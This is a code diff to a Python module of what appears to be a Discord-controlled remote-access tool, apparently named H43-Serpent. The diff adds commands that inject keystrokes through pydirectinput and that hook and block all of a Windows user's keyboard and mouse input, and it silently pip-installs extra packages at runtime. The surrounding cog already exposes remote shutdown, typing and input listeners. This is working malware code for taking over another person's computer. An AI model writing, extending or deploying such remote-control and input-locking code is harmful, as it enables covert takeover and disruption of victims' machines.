@@ -11,14 +11,10 @@ REPO: https://github.com/Fytex/H43-Serpent
 '''
 
 
-import sys, os
-
-sys.stdout = open(os.devnull, 'w')
-sys.stderr = open(os.devnull, 'w')
-
-
+import sys
 import subprocess
-packages = ['pynput', 'pycaw', 'pillow']
+
+packages = ['pynput', 'pycaw', 'pillow', 'PyDirectInput']
 while subprocess.call(
     [sys.executable, '-m', 'pip', 'install', '--upgrade', *packages],
     stdout=subprocess.DEVNULL,
@@ -31,11 +27,17 @@ import io
 import time
 import math
 import pynput
+import ctypes
 import asyncio
 import discord
 import tempfile
 import winsound
+import win32api  # Downloaded previously (in bot.pyw)
+import win32con  # Downloaded previously (in bot.pyw)
+import pythoncom # Downloaded previously (in bot.pyw)
+import threading
 import webbrowser
+import pydirectinput
 
 
 from PIL import Image
@@ -53,12 +55,26 @@ from pynput.keyboard import Key, Controller
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 
+subprocess.call(
+    [sys.executable, '-m', 'pip', 'install', '--upgrade', 'pyWinhook'],
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL
+)
+try:
+    import pyWinhook as pyHook
+except ModuleNotFoundError:
+    HAS_PYHOOK = False
+else:
+    HAS_PYHOOK = True
+
+
 
 class Lib(commands.Cog):
 
     def __init__(self, bot):
         self.bot = bot
         self.tmp_sound = None
+        self.blocker_thread = None
         self.mouse_listener = None
         self.keyboard_listener = None
 
@@ -102,6 +118,66 @@ class Lib(commands.Cog):
             os.system(f'shutdown /a')
         else:
             os.system(f'shutdown /s /t {time_sec}')
+
+
+
+    def _parse_cmds(self, arg, actions):
+        type_text = actions['type_text']
+        press_key = actions['press_key']
+        release_key = actions['release_key']
+        tap_key = actions['tap_key']
+
+        special_keys = actions['special_keys']
+
+        cmd_buffer = []
+        text_buffer = ''
+
+        while arg:
+            is_special_key = False
+                
+            for special_key in special_keys.keys():
+                if arg.lower().startswith('<' + special_key + '>'):            
+                    if text_buffer:
+                        cmd_buffer.append(type_text(text_buffer))
+                        text_buffer = ''
+
+                    cmd_buffer.append(press_key(special_keys[special_key]))
+                    arg = arg[len('<' + special_key + '>'):]
+                    is_special_key = True
+                    break
+
+                elif arg.lower().startswith('</' + special_key + '>'):
+                    if text_buffer:
+                        cmd_buffer.append(type_text(text_buffer))
+                        text_buffer = ''
+
+                    cmd_buffer.append(release_key(special_keys[special_key]))
+                    arg = arg[len('</' + special_key + '>'):]
+                    is_special_key = True
+                    break
+
+                elif arg.lower().startswith('{' + special_key + '}'):
+                    if text_buffer:
+                        cmd_buffer.append(type_text(text_buffer))
+                        text_buffer = ''
+
+                    cmd_buffer.append(tap_key(special_keys[special_key]))
+                    arg = arg[len('{' + special_key + '}'):]
+                    is_special_key = True
+                    break
+
+            if not is_special_key:
+                text_buffer += arg[0]
+                arg = arg[1:]
+
+
+        if text_buffer:
+            cmd_buffer.append(type_text(text_buffer))
+
+        return cmd_buffer
+
+        
+        
     
 
     @commands.command(
@@ -113,65 +189,81 @@ class Lib(commands.Cog):
         *, cmds_line = commands.parameter(description='Instructions')
     ):
         c = Controller()
-        special_keys = Key.__members__
+
+        actions = {
+            'type_text': lambda t: lambda: c.type(t),
+            'press_key': lambda k: lambda: c.press(k),
+            'release_key': lambda k: lambda: c.release(k),
+            'tap_key': lambda k: lambda: c.tap(k),
+            'special_keys': Key.__members__
+        }
 
         args = cmds_line.split('|')
 
-        type_text = lambda t: lambda: c.type(t)
-        press_key = lambda k: lambda: c.press(k)
-        release_key = lambda k: lambda: c.release(k)
-        tap_key = lambda k: lambda: c.tap(k)
-
         for arg in args:
-            cmd_buffer = []
-            text_buffer = ''
-
-            while arg:
-                is_special_key = False
-                
-                for special_key in special_keys.keys():
-                    if arg.lower().startswith('<' + special_key + '>'):            
-                        if text_buffer:
-                            cmd_buffer.append(type_text(text_buffer))
-                            text_buffer = ''
-
-                        cmd_buffer.append(press_key(special_keys[special_key]))
-                        arg = arg[len('<' + special_key + '>'):]
-                        is_special_key = True
-                        break
-
-                    elif arg.lower().startswith('</' + special_key + '>'):
-                        if text_buffer:
-                            cmd_buffer.append(type_text(text_buffer))
-                            text_buffer = ''
-
-                        cmd_buffer.append(release_key(special_keys[special_key]))
-                        arg = arg[len('</' + special_key + '>'):]
-                        is_special_key = True
-                        break
-
-                    elif arg.lower().startswith('{' + special_key + '}'):
-                        if text_buffer:
-                            cmd_buffer.append(type_text(text_buffer))
-                            text_buffer = ''
-
-                        cmd_buffer.append(tap_key(special_keys[special_key]))
-                        arg = arg[len('{' + special_key + '}'):]
-                        is_special_key = True
-                        break
-
-                if not is_special_key:
-                    text_buffer += arg[0]
-                    arg = arg[1:]
-
-
-            if text_buffer:
-                cmd_buffer.append(type_text(text_buffer))
-
+            
+            cmd_buffer = self._parse_cmds(arg, actions)
+            
             for cmd in cmd_buffer:
                 cmd()
 
             await asyncio.sleep(0.3)
+
+
+    @commands.command()
+    async def type2(self, ctx, *, cmds_line):
+        actions = {
+            'type_text': lambda t: lambda: pydirectinput.write(t),
+            'press_key': lambda k: lambda: pydirectinput.keyDown(k),
+            'release_key': lambda k: lambda: pydirectinput.keyUp(k),
+            'tap_key': lambda k: lambda: pydirectinput.press(k),
+            'special_keys': {k:k for k in pydirectinput.KEYBOARD_MAPPING.keys()}
+        }
+
+        args = cmds_line.split('|')
+
+        for arg in args:
+            
+            cmd_buffer = self._parse_cmds(arg, actions)
+            
+            for cmd in cmd_buffer:
+                cmd()
+
+            await asyncio.sleep(0.3)
+
+
+    @commands.command()
+    @commands.check(lambda _: HAS_PYHOOK)
+    async def lock_input2(self, ctx):
+
+        def input_blocker():
+            # create a hook manager and register the block_input function
+            hm = pyHook.HookManager()
+            hm.MouseAll = lambda _: False
+            hm.KeyAll = lambda _: False
+            hm.HookMouse()
+            hm.HookKeyboard()
+            # start the event loop to capture and discard events
+            pythoncom.PumpMessages()
+            # unhook the mouse and keyboard hooks
+            hm.UnhookMouse()
+            hm.UnhookKeyboard()
+
+        if self.blocker_thread:
+            win32api.PostThreadMessage(self.blocker_thread.ident, win32con.WM_QUIT, 0, 0);
+            self.blocker_thread.join()
+
+        self.blocker_thread = threading.Thread(target=input_blocker)
+        self.blocker_thread.start()
+
+    @commands.command()
+    @commands.check(lambda _: HAS_PYHOOK)
+    async def unlock_input2(self, ctx):
+        if self.blocker_thread:
+            # stop the event loop to unblock the input
+            win32api.PostThreadMessage(self.blocker_thread.ident, win32con.WM_QUIT, 0, 0);
+            self.blocker_thread.join()
+            self.blocker_thread = None
                         
 
     @commands.command(
